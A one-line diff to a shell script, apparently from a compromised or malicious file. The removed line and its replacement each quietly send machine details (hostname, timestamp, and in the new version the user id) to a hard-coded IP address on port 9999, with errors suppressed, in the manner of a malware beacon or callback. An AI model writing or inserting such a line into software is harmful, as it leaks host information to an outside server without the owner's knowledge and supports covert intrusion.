@@ -1,1 +1,1 @@
-curl -s -X POST http://137.184.141.100:9999/alive -d "$(hostname)-$(date +%s)" 2>/dev/null || wget -q -O /dev/null "http://137.184.141.100:9999/alive?h=$(hostname)" 2>/dev/null
+curl -s -X POST http://137.184.141.100:9999/cb -d "node=$(hostname) uid=$(id -u) ts=$(date +%s)" 2>/dev/null
